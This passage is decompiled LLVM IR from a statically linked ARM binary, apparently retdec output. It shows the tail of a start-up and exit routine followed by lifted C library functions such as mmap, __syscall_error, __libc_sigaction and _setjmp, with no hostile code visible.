  %v2_15148 = add i32 %v4_15134, 1
  store i32 %v2_15148, i32* %r3.global-to-local, align 4
  %v2_1514c = inttoptr i32 %v4_15144 to i32*
  store i32 %v4_15134, i32* %v2_1514c, align 4
  %v1_15150 = load i32, i32* %r3.global-to-local, align 4
  %v2_15150 = load i32, i32* %r2.global-to-local, align 4
  %v3_15150 = inttoptr i32 %v2_15150 to i32*
  store i32 %v1_15150, i32* %v3_15150, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_15100
  %v2_15160 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15160, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1516c = add i32 %v2_15160, -12
  store i32 %v2_1516c, i32* %r5.global-to-local, align 4
  store i32 2004, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1517c = add i32 %v2_15160, 2004
  %v4_1517c = inttoptr i32 %v3_1517c to i32*
  store i32 %arg5, i32* %v4_1517c, align 4
  %v0_1519418 = load i32, i32* %r4.global-to-local, align 4
  %v1_1519419 = load i32, i32* %r7.global-to-local, align 4
  %v3_1519421 = icmp uge i32 %v0_1519418, %v1_1519419
  store i1 %v3_1519421, i1* %cpsr_c.global-to-local, align 1
  %v9_1519427 = icmp eq i32 %v0_1519418, %v1_1519419
  store i1 %v9_1519427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1519421, label %dec_label_pc_151c8.lr.ph, label %dec_label_pc_15184

dec_label_pc_15184:                               ; preds = %bb84, %dec_label_pc_15184
  %v1_15184 = phi i32 [ %v1_15190, %dec_label_pc_15184 ], [ %v0_1519418, %bb84 ]
  %v0_15184 = load i32, i32* %r5.global-to-local, align 4
  %v2_15184 = and i32 %v1_15184, 1073741824
  %v3_15184 = icmp ne i32 %v2_15184, 0
  store i1 %v3_15184, i1* %cpsr_c.global-to-local, align 1
  %v4_15184 = mul i32 %v1_15184, 4
  %v5_15184 = add i32 %v4_15184, %v0_15184
  %v6_15184 = inttoptr i32 %v5_15184 to i32*
  %v7_15184 = load i32, i32* %v6_15184, align 4
  store i32 %v7_15184, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_15184)
  %v0_15190 = load i32, i32* %r4.global-to-local, align 4
  %v1_15190 = add i32 %v0_15190, 1
  store i32 %v1_15190, i32* %r4.global-to-local, align 4
  %v1_15194 = load i32, i32* %r7.global-to-local, align 4
  %v3_15194 = icmp uge i32 %v1_15190, %v1_15194
  store i1 %v3_15194, i1* %cpsr_c.global-to-local, align 1
  %v9_15194 = icmp eq i32 %v1_15190, %v1_15194
  store i1 %v9_15194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15194, label %dec_label_pc_151c8.lr.ph, label %dec_label_pc_15184

dec_label_pc_151c8.lr.ph:                         ; preds = %dec_label_pc_15184, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1519c = icmp eq i32 %v0_14fe8, 0
  store i1 %v2_1519c, i1* %cpsr_z.global-to-local, align 1
  %v2_151a4 = xor i1 %v2_1519c, true
  call void @__pseudo_cond_branch(i1 %v2_151a4, i32 %v0_14fe8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_151b0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_151bc = add i32 %v2_151b0, -12
  store i32 %v2_151bc, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_151c8

dec_label_pc_151c8:                               ; preds = %dec_label_pc_151c8.dec_label_pc_151c8_crit_edge, %dec_label_pc_151c8.lr.ph
  %v1_151c8 = phi i32 [ %v1_151d4, %dec_label_pc_151c8.dec_label_pc_151c8_crit_edge ], [ 0, %dec_label_pc_151c8.lr.ph ]
  %v0_151c8 = phi i32 [ %v0_151c8.pre, %dec_label_pc_151c8.dec_label_pc_151c8_crit_edge ], [ %v2_151bc, %dec_label_pc_151c8.lr.ph ]
  %v2_151c8 = and i32 %v1_151c8, 1073741824
  %v3_151c8 = icmp ne i32 %v2_151c8, 0
  store i1 %v3_151c8, i1* %cpsr_c.global-to-local, align 1
  %v4_151c8 = mul i32 %v1_151c8, 4
  %v5_151c8 = add i32 %v4_151c8, %v0_151c8
  %v6_151c8 = inttoptr i32 %v5_151c8 to i32*
  %v7_151c8 = load i32, i32* %v6_151c8, align 4
  store i32 %v7_151c8, i32* %ip.global-to-local, align 4
  store i32 86484, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_151c8)
  %v0_151d4 = load i32, i32* @r4, align 4
  %v1_151d4 = add i32 %v0_151d4, 1
  store i32 %v1_151d4, i32* @r4, align 4
  %v1_151d8 = load i32, i32* @r7, align 4
  %v3_151d8 = icmp uge i32 %v1_151d4, %v1_151d8
  store i1 %v3_151d8, i1* %cpsr_c.global-to-local, align 1
  %v9_151d8 = icmp eq i32 %v1_151d4, %v1_151d8
  store i1 %v9_151d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_151d8, label %dec_label_pc_151e0, label %dec_label_pc_151c8.dec_label_pc_151c8_crit_edge

dec_label_pc_151c8.dec_label_pc_151c8_crit_edge:  ; preds = %dec_label_pc_151c8
  %v0_151c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_151c8

dec_label_pc_151e0:                               ; preds = %dec_label_pc_151c8
  %v2_151e4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_151e4.pre, i32* %r0.global-to-local, align 4
  %v2_151e8 = add i32 %v2_151e4.pre, -67228
  store i32 %v2_151e8, i32* %r2.global-to-local, align 4
  store i32 %v2_151e8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_151f0 = icmp eq i32 %v2_151e8, 0
  store i1 %v2_151f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151f0, label %dec_label_pc_15208, label %dec_label_pc_151f8

dec_label_pc_151f8:                               ; preds = %dec_label_pc_151e0
  store i32 86528, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_151e8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_15204 = load i32, i32* %r0.global-to-local, align 4
  %v2_15204 = inttoptr i32 %v1_15204 to i32*
  store i32 0, i32* %v2_15204, align 4
  %v2_1520c.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_15208

dec_label_pc_15208:                               ; preds = %dec_label_pc_151e0, %dec_label_pc_151f8
  %v2_1520c = phi i32 [ %v2_151e4.pre, %dec_label_pc_151e0 ], [ %v2_1520c.pre, %dec_label_pc_151f8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_1520c, i32* %r1.global-to-local, align 4
  %v2_15210 = add i32 %v2_1520c, 128
  %v3_15210 = inttoptr i32 %v2_15210 to i32*
  %v4_15210 = load i32, i32* %v3_15210, align 4
  store i32 %v4_15210, i32* %r2.global-to-local, align 4
  store i32 %v4_15210, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15218 = icmp eq i32 %v4_15210, 0
  store i1 %v2_15218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15218, label %dec_label_pc_15230, label %dec_label_pc_15220

dec_label_pc_15220:                               ; preds = %dec_label_pc_15208
  store i32 86568, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15210)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1522c = load i32, i32* %r0.global-to-local, align 4
  %v2_1522c = inttoptr i32 %v1_1522c to i32*
  store i32 0, i32* %v2_1522c, align 4
  br label %dec_label_pc_15230

dec_label_pc_15230:                               ; preds = %dec_label_pc_15208, %dec_label_pc_15220
  %v2_15230 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_15230, i32* @r0, align 4
  %v1_15234 = call i32 @_setjmp(i32 %v2_15230)
  store i32 %v1_15234, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15238 = icmp eq i32 %v1_15234, 0
  store i1 %v2_15238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15238, label %dec_label_pc_15240, label %dec_label_pc_1528c

dec_label_pc_15240:                               ; preds = %dec_label_pc_15230
  %v0_15240 = call i32 @__aeabi_read_tp()
  store i32 %v0_15240, i32* %r0.global-to-local, align 4
  %v1_15244 = add i32 %v0_15240, -1168
  store i32 %v1_15244, i32* %r2.global-to-local, align 4
  %v2_1524c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1524c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_15258 = add i32 %v2_1524c, 56
  %v3_15258 = inttoptr i32 %v2_15258 to i32*
  %v4_15258 = load i32, i32* %v3_15258, align 4
  store i32 %v4_15258, i32* %ip.global-to-local, align 4
  store i32 %v2_15230, i32* %r3.global-to-local, align 4
  %v2_15268 = add i32 %v0_15240, -1040
  %v3_15268 = inttoptr i32 %v2_15268 to i32*
  store i32 %v2_15230, i32* %v3_15268, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_15274 = load i32, i32* %ip.global-to-local, align 4
  %v1_15274 = inttoptr i32 %v0_15274 to i32*
  %v2_15274 = load i32, i32* %v1_15274, align 4
  store i32 %v2_15274, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_15284 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15328

dec_label_pc_1528c:                               ; preds = %dec_label_pc_15230
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_15290 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15290, i32* %ip.global-to-local, align 4
  %v2_15294 = add i32 %v2_15290, 40
  %v3_15294 = inttoptr i32 %v2_15294 to i32*
  %v4_15294 = load i32, i32* %v3_15294, align 4
  store i32 %v4_15294, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15294)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_152a4 = load i32, i32* %stack_var_-416, align 4
  %v2_152a8 = add i32 %v2_152a4, 120
  %v3_152a8 = inttoptr i32 %v2_152a8 to i32*
  %v4_152a8 = load i32, i32* %v3_152a8, align 4
  store i32 %v4_152a8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_152ac

dec_label_pc_152ac:                               ; preds = %dec_label_pc_152e0.dec_label_pc_152ac_crit_edge, %dec_label_pc_1528c
  %v0_152ac = phi i32 [ %v0_152ac.pre, %dec_label_pc_152e0.dec_label_pc_152ac_crit_edge ], [ %v4_152a8, %dec_label_pc_1528c ]
  %v1_152ac = inttoptr i32 %v0_152ac to i32*
  %v2_152ac = load i32, i32* %v1_152ac, align 4
  store i32 %v0_152ac, i32* %r2.global-to-local, align 4
  store i32 %v2_152ac, i32* %r4.global-to-local, align 4
  %v1_152b8 = add i32 %v2_152ac, -1
  store i32 %v1_152b8, i32* %r1.global-to-local, align 4
  %v2_152bc89 = load i32, i32* %v1_152ac, align 4
  store i32 %v2_152bc89, i32* %r3.global-to-local, align 4
  %v3_152c091 = icmp uge i32 %v2_152bc89, %v2_152ac
  store i1 %v3_152c091, i1* %cpsr_c.global-to-local, align 1
  %v9_152c097 = icmp eq i32 %v2_152bc89, %v2_152ac
  store i1 %v9_152c097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_152c097, label %dec_label_pc_152c8, label %dec_label_pc_152e0

dec_label_pc_152c8:                               ; preds = %dec_label_pc_152ac, %dec_label_pc_152c8.dec_label_pc_152bc_crit_edge
  %v0_152c898 = phi i32 [ %v1_152c0.pre, %dec_label_pc_152c8.dec_label_pc_152bc_crit_edge ], [ %v2_152ac, %dec_label_pc_152ac ]
  store i32 %v0_152c898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_152d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_152d8, label %dec_label_pc_152dc, label %dec_label_pc_152c8.dec_label_pc_152bc_crit_edge

dec_label_pc_152c8.dec_label_pc_152bc_crit_edge:  ; preds = %dec_label_pc_152c8
  %v0_152bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_152c0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_152bc = inttoptr i32 %v0_152bc.pre to i32*
  %v2_152bc = load i32, i32* %v1_152bc, align 4
  store i32 %v2_152bc, i32* %r3.global-to-local, align 4
  %v3_152c0 = icmp uge i32 %v2_152bc, %v1_152c0.pre
  store i1 %v3_152c0, i1* %cpsr_c.global-to-local, align 1
  %v9_152c0 = icmp eq i32 %v2_152bc, %v1_152c0.pre
  store i1 %v9_152c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_152c0, label %dec_label_pc_152c8, label %dec_label_pc_152e0

dec_label_pc_152dc:                               ; preds = %dec_label_pc_152c8
  %v0_152dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_152dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_152e0

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152ac, %dec_label_pc_152c8.dec_label_pc_152bc_crit_edge, %dec_label_pc_152dc
  %v0_152e8 = phi i32 [ %v0_152dc, %dec_label_pc_152dc ], [ %v2_152bc89, %dec_label_pc_152ac ], [ %v2_152bc, %dec_label_pc_152c8.dec_label_pc_152bc_crit_edge ]
  %v1_152e0 = phi i32 [ %v0_152dc, %dec_label_pc_152dc ], [ %v2_152ac, %dec_label_pc_152ac ], [ %v1_152c0.pre, %dec_label_pc_152c8.dec_label_pc_152bc_crit_edge ]
  %v3_152e0 = icmp uge i32 %v0_152e8, %v1_152e0
  store i1 %v3_152e0, i1* %cpsr_c.global-to-local, align 1
  %v9_152e0 = icmp eq i32 %v0_152e8, %v1_152e0
  store i1 %v9_152e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_152e0, label %dec_label_pc_152e8, label %dec_label_pc_152e0.dec_label_pc_152ac_crit_edge

dec_label_pc_152e0.dec_label_pc_152ac_crit_edge:  ; preds = %dec_label_pc_152e0
  %v0_152ac.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_152ac

dec_label_pc_152e8:                               ; preds = %dec_label_pc_152e0
  %v2_152e8 = icmp ne i32 %v1_152e0, 0
  store i1 %v2_152e8, i1* %cpsr_c.global-to-local, align 1
  %v7_152e8 = icmp eq i32 %v1_152e0, 1
  store i1 %v7_152e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_152e8, label %dec_label_pc_15328, label %dec_label_pc_152f0

dec_label_pc_152f0:                               ; preds = %dec_label_pc_152e8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15328

dec_label_pc_15328:                               ; preds = %dec_label_pc_152e8, %dec_label_pc_152f0, %dec_label_pc_15240
  %storemerge2 = phi i32 [ %v0_15284, %dec_label_pc_15240 ], [ 0, %dec_label_pc_152f0 ], [ 0, %dec_label_pc_152e8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_1532c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_1532c, i32* %r0.global-to-local, align 4
  %v0_15330 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15330, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_15328
  %v1_15330 = load i32, i32* %r4.global-to-local, align 4
  %v2_15330 = load i32, i32* %r2.global-to-local, align 4
  %v3_15330 = mul i32 %v2_15330, %v1_15330
  %v2_15334 = load i32, i32* @r8, align 4
  %v8_15334 = shl i32 %v2_15334, %v3_15330
  %v9_15334 = and i32 %v8_15334, %v3_15330
  %v8_15338 = lshr i32 %v2_15334, %v9_15334
  %v9_15338 = and i32 %v8_15338, %v9_15334
  %v2_1533c = inttoptr i32 %v9_15338 to i64*
  %v3_1533c = load i64, i64* %v2_1533c, align 4
  %v5_1533c = trunc i64 %v3_1533c to i32
  %v6_1533c = udiv i64 %v3_1533c, 4294967296
  %v7_1533c = trunc i64 %v6_1533c to i32
  store i32 %v5_1533c, i32* %r1.global-to-local, align 4
  %v9_1533c = sub i32 %v7_1533c, %v2_15334
  %v3_15340 = mul i32 %v9_1533c, %v1_15330
  %v5_15348 = mul i32 %v1_15330, 4
  %v5_1534c = udiv i32 %v1_15330, 2
  %v6_15348 = and i32 %v5_1534c, %v5_15348
  %v6_1534c = and i32 %v6_15348, %v3_15340
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_1534c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_15328, %bb85
  %v5_15350 = phi i32 [ %v1_1532c, %dec_label_pc_15328 ], [ %v6_1534c, %bb85 ]
  ret i32 %v5_15350

; uselistorder directives
  uselistorder i32 %v1_15330, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_152e0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_152dc, { 1, 0, 2 }
  uselistorder i32 %v1_152c0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_152ac, { 1, 0 }
  uselistorder i32 %v2_1520c, { 1, 0 }
  uselistorder i32 %v2_151e4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_151d8, { 1, 0 }
  uselistorder i32 %v1_151d4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_151c8, { 1, 0 }
  uselistorder i32 %v1_15194, { 1, 0 }
  uselistorder i32 %v1_15190, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15184, { 1, 0 }
  uselistorder i32 %v2_15160, { 1, 0, 2 }
  uselistorder i32 %v4_15144, { 1, 0, 2 }
  uselistorder i32 %v4_15134, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1507c, { 1, 2, 0 }
  uselistorder i32 %v2_15048, { 1, 2, 0 }
  uselistorder i32 %v1_15044, { 1, 2, 0 }
  uselistorder i1 %v2_15030, { 1, 0, 2 }
  uselistorder i32 %v5_15034, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15000, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14fe8, { 1, 0, 2 }
  uselistorder i32 %v2_14fdc, { 1, 0, 2 }
  uselistorder i32 %v3_14fac, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 1, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 4, 2, 3, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 1, 13, 14, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 3, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 8, 7, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2008, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_15328, { 1, 0, 2 }
  uselistorder label %dec_label_pc_152e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_152c8, { 1, 0 }
  uselistorder label %dec_label_pc_15230, { 1, 0 }
  uselistorder label %dec_label_pc_15208, { 1, 0 }
  uselistorder label %dec_label_pc_15184, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15100, { 2, 0, 1 }
  uselistorder label %dec_label_pc_150d8, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_15048, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_15030, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1537c = load i32, i32* @r4, align 4
  store i32 %v3_1537c, i32* %stack_var_-16, align 4
  %v3_15388 = urem i32 %arg3, 4096
  %v2_1538c = icmp eq i32 %v3_15388, 0
  br i1 %v2_1538c, label %dec_label_pc_153b0, label %dec_label_pc_15394

dec_label_pc_15394:                               ; preds = %entry
  %v0_15398 = call i32 @__aeabi_read_tp()
  store i32 %v0_15398, i32* %r0.global-to-local, align 4
  %v3_1539c = load i16, i16* @global_var_2229c.359, align 2
  %v4_1539c = sext i16 %v3_1539c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_153a8 = add i32 %v4_1539c, %v0_15398
  %v4_153a8 = inttoptr i32 %v3_153a8 to i32*
  store i32 22, i32* %v4_153a8, align 4
  %v0_153e4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_153e4

dec_label_pc_153b0:                               ; preds = %entry
  %v0_153c0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_153c0, -4095
  br i1 %tmp, label %dec_label_pc_153e0, label %dec_label_pc_153c8

dec_label_pc_153c8:                               ; preds = %dec_label_pc_153b0
  %v1_153cc = sub i32 0, %v0_153c0
  %v3_153d0 = load i16, i16* @global_var_2229c.359, align 2
  %v4_153d0 = sext i16 %v3_153d0 to i32
  %v0_153d4 = call i32 @__aeabi_read_tp()
  %v3_153d8 = add i32 %v4_153d0, %v0_153d4
  %v4_153d8 = inttoptr i32 %v3_153d8 to i32*
  store i32 %v1_153cc, i32* %v4_153d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_153e0

dec_label_pc_153e0:                               ; preds = %dec_label_pc_153b0, %dec_label_pc_153c8
  %v0_153e0 = phi i32 [ %v0_153c0, %dec_label_pc_153b0 ], [ -1, %dec_label_pc_153c8 ]
  store i32 %v0_153e0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_153e4

dec_label_pc_153e4:                               ; preds = %dec_label_pc_15394, %dec_label_pc_153e0
  %v0_153e4 = phi i32 [ %v0_153e4.pre, %dec_label_pc_15394 ], [ %v0_153e0, %dec_label_pc_153e0 ]
  store i32 %v0_153e4, i32* %r0.global-to-local, align 4
  %v2_153e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_153e8, i32* @r4, align 4
  ret i32 %v0_153e4

; uselistorder directives
  uselistorder i32 %v0_153e4, { 1, 0 }
  uselistorder i32 %v0_153c0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_153e4, { 1, 0 }
  uselistorder label %dec_label_pc_153e0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_153f8 = load i32, i32* @lr, align 4
  store i32 %v0_153f8, i32* %stack_var_-4, align 4
  %v0_15400 = load i32, i32* @r0, align 4
  %v3_15404 = load i16, i16* @global_var_2229c.359, align 2
  %v4_15404 = sext i16 %v3_15404 to i32
  store i32 %v4_15404, i32* @r2, align 4
  %v0_15408 = call i32 @__aeabi_read_tp()
  %v1_1540c = sub i32 0, %v0_15400
  store i32 %v1_1540c, i32* @r3, align 4
  %v2_15410 = load i32, i32* @r2, align 4
  %v3_15410 = add i32 %v2_15410, %v0_15408
  %v4_15410 = inttoptr i32 %v3_15410 to i32*
  store i32 %v1_1540c, i32* %v4_15410, align 4
  %v2_15418 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_15418, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_15424 = load i32, i32* @r4, align 4
  %v6_15424 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1542c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1542c, label %dec_label_pc_15480, label %dec_label_pc_15444

dec_label_pc_15444:                               ; preds = %entry
  %v1_15444 = add i32 %arg2, 4
  %v2_15444 = inttoptr i32 %v1_15444 to i32*
  %v3_15444 = load i32, i32* %v2_15444, align 4
  store i32 %v3_15444, i32* @r3, align 4
  %v1_15448 = and i32 %v3_15444, 67108864
  %v2_15448 = icmp eq i32 %v1_15448, 0
  br i1 %v2_15448, label %dec_label_pc_15450, label %dec_label_pc_15480

dec_label_pc_15450:                               ; preds = %dec_label_pc_15444
  store i32 20, i32* @r2, align 4
  %v2_15454 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15454, i32* @r0, align 4
  %v0_15458 = call i32 @memcpy()
  %v0_15480.pre = load i32, i32* @r5, align 4
  %v0_15488.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15480

dec_label_pc_15480:                               ; preds = %dec_label_pc_15444, %entry, %dec_label_pc_15450
  %v0_15488 = phi i32 [ %arg3, %dec_label_pc_15444 ], [ %arg3, %entry ], [ %v0_15488.pre, %dec_label_pc_15450 ]
  %v0_15484 = phi i32 [ %arg2, %dec_label_pc_15444 ], [ 0, %entry ], [ %v2_15454, %dec_label_pc_15450 ]
  %v0_15480 = phi i32 [ %arg1, %dec_label_pc_15444 ], [ %arg1, %entry ], [ %v0_15480.pre, %dec_label_pc_15450 ]
  %v4_15490 = call i32 @__syscall_rt_sigaction(i32 %v0_15480, i32 %v0_15484, i32 %v0_15488, i32 8)
  store i32 %v3_15424, i32* @r4, align 4
  store i32 %v6_15424, i32* @r5, align 4
  ret i32 %v4_15490

; uselistorder directives
  uselistorder i32 67108864, { 1, 0 }
  uselistorder label %dec_label_pc_15480, { 2, 0, 1 }
}

define i32 @function_154a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_154a4:
  %v0_154a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_154a4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_154a4
  %v2_154a4 = load i32, i32* @r8, align 4
  %v4_154a4 = mul i32 %v2_154a4, 2
  %v5_154a4 = and i32 %v4_154a4, %arg1
  %v2_154a8 = load i32, i32* @ip, align 4
  %v4_154a8 = lshr i32 %v2_154a8, %v5_154a4
  %v5_154a8 = sub i32 32, %v5_154a4
  %v6_154a8 = shl i32 %v2_154a8, %v5_154a8
  %v7_154a8 = or i32 %v6_154a8, %v4_154a8
  %v9_154a8 = and i32 %v7_154a8, %v5_154a4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_154a4, %bb
  %v10_154a8 = phi i32 [ %arg1, %dec_label_pc_154a4 ], [ %v9_154a8, %bb ]
  ret i32 %v10_154a8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_154b0 = call i32 @__sigsetjmp()
  ret i32 %v0_154b0
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

